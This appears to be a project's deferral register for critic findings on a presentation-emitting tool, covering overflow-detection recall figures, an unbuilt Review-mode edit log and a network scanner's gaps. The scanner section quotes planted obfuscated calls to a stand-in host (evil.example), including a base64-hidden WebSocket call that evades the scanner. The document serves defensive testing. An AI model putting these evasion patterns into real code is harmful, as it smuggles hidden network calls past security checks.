# DEFERRED

Per §21.4: severity-2 findings are fixed unless a written rationale is filed
here. Severity-1 findings are never deferred — they block emit and there is no
override flag.

This file is the register that makes a deferral a deliberate, reviewable act
rather than an omission. A finding that is absent from both the fix log and this
file has been forgotten, not decided.

---

## Critic passes run

| Pass | Report | Axes | Findings | Disposition |
|---|---|---|---|---|
| 1 | `CRITIQUE-1.md` | 6 pass, 5 fail | 7 sev-1, 10 sev-2, 7 sev-3 | **All 24 fixed.** Nothing deferred |
| 2 | `CRITIQUE-2.md` | 9 pass, 2 fail | 1 sev-1, 7 sev-2, 8 sev-3 | **All 16 closed** |
| 3 | `CRITIQUE-3.md` | 10 pass, 1 fail | 2 sev-1, 5 sev-2, 5 sev-3 | **All 12 closed.** One item not built, argued below |

§21's exit condition is the critic clean on all eleven axes **twice
consecutively**, the second pass against a freshly emitted artifact. **No pass
has yet come back clean**, so the counter stands at zero: pass 1 failed five
axes, pass 2 failed two, pass 3 failed one.

The two axes that failed are the two the fixes were aimed at, and both now have
a number rather than an assertion. Axis 5, overflow detection efficacy: §17.4
asks for recall ≥ 0.98 and pass 2 measured 0.65. It is now **0.9921** per box
and per finding, measured in Chromium against the emitted corpus artifact, with
precision 1.0000. Axis 9, degradation honesty: the reported saving now equals
the actual saving at every budget tested, where it was out by exactly 2×.

---

## Not built, from CRITIQUE-3

### The edit log in a Review build

*Not a deferral of a finding — §18.3 is enforced. A question raised while
closing it, answered, and deliberately left for the lane that owns the surface.*

§18.3 makes the artifact say **that** a specimen was edited, and L8's marker
carries the record count. In a Review build — §14's "the one a client's team
reads at leisure" — that count is a promise of a record the artifact does not
contain. A recipient reading "2 edit records" has nowhere to go.

L10's answer, which I accept: **yes it should exist, and no it should not be
built in the emitter.** Every emitter-shaped surface is the wrong one. A
per-scene surface is a layout change, and L8-14 forbids mode-branching precisely
so ids and measurement stay mode-invariant — breaking that to print a log puts
the deck's geometry back in play. A deck-level surface is L8's and L9's. And an
emitter-level surface that is not on stage (an HTML comment, a `<details>` after
the stage) is either invisible to the reader it is for, or a presentation
surface built outside the presentation lane.

It belongs in Review mode as a **runtime** surface: the notes already travel in
the model payload, the review build already differs in what the model carries
(E12 strips presenter notes), and a reviewer-only panel is L2/L9 furniture. The
emitter's part is one line — stop stripping, start declaring.

Recorded rather than built because *what the emitter should not do is grow a
second rendering path so one law can print its evidence.*

---

## Deferred from CRITIQUE-2

### C16 · The network scanner does not see a base64-obfuscated API name

*Severity 3. Deferred pending L10's judgment, which is the correct owner.*

26 of the critic's 27 planted network references were caught, including
`window["fe"+"tch"]("htt"+"ps://evil.example/x")`. The miss:

```js
new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))
```

No token and no URL, so there is nothing for `JS_NETWORK_TOKENS` to match.

**The critic could not find a product path to it and said so.** Planted as a
`raw` `ContentBlock` — which is how a prospect's own obfuscated analytics would
actually arrive — the whole `<script>` is flattened to text by
`src/scene/blocks.js` before the scanner runs, and the base64 payload is absent
from the emitted file. It is a hardening note about a lane API, not a live hole.

The reason this is deferred rather than fixed is that the fix has a real cost and
the threat does not: a base64-decode pass over inline script fires on every
legitimate `atob`, and §1.1's law is enforced by *this* scanner, so a rule that
cries wolf degrades the defence that is working. L10 has been asked to decide and
to record the answer either way. **"We looked at this and chose not to, because
—" is the outcome being sought**, not a fix by default.

### C1's residual · one box out of 126, and it is a measurement limit

*Not a deferral of the finding — the axis it belongs to now passes. Recorded
because the residual is real and someone should not have to re-derive it.*

L11's browser-measured recall over the emitted corpus artifact leaves one box
Chromium cuts that the model does not report:

```
"HX-400 shell-and-tube heat exchanger — Northwind Industrial"
  Chromium  351.13px      engine  348.70px      container  350px
```

Re-measured after the corpus fixture began running real recipes (CRITIQUE-3 P5),
over a deck three times the size:

```
boxes measured 4089    findings 150
recall over boxes Chromium cuts        150/151 = 0.9934    precision 1.0000
recall over all boxes not fitting      150/159 = 0.9434
```

The nine-box residual is fully accounted for: this box, plus eight `badgeNumber`
ascenders described above. Nothing is filtered by role — L11's precision figure
is over the whole population.

0.69% apart, with the container edge falling between them, so Chromium wraps to
a third line and the model keeps two. That sits inside the residual disagreement
`overflow-browser.test.mjs` already measures across the deck — mean 0.158%,
p95 0.890% — so it is a limit of `src/core/text-metrics.js`'s advance tables
against a real rasteriser, not a defect in the detector.

Closing it means either shipping per-glyph hinted metrics for every face, or
widening the noise band until the check stops catching real overflow. Neither is
worth 1 box in 126. **What is not acceptable is buying the number by widening
the band, and L11 and L8 each declined to do that explicitly.**

### `badgeNumber`'s height is unmeasurable — **closed**

Was deferred to keep the tree quiet for a §20 pass; L8 closed it in the round
after. `data-pp-lines="<n>"` declares that an element's block box is exactly *n*
line boxes of its own role, held to an equality against Chromium's
`clientHeight`, so the badge is measured against its own 40px box rather than
the `fanSource` slot's 536px column.

What remains on that role is eight boxes of ink standing 2–3px proud of an
unclipped line box — a rasteriser's ascender, which no line-box model reports,
and not the same defect. The hole is closed; the residual is named in the recall
figure below rather than deferred.

---

## Nothing else is deferred

Every other finding in both reports is either fixed or in flight with a named
owner. Where a lane disagreed with a finding, the disagreement is recorded in
`docs/disputes/L<n>-*.md` and indexed in `CONTRACTS-DISPUTES.md`, and the lane
built against the contract as written regardless — which is §4's rule, not a
deferral.
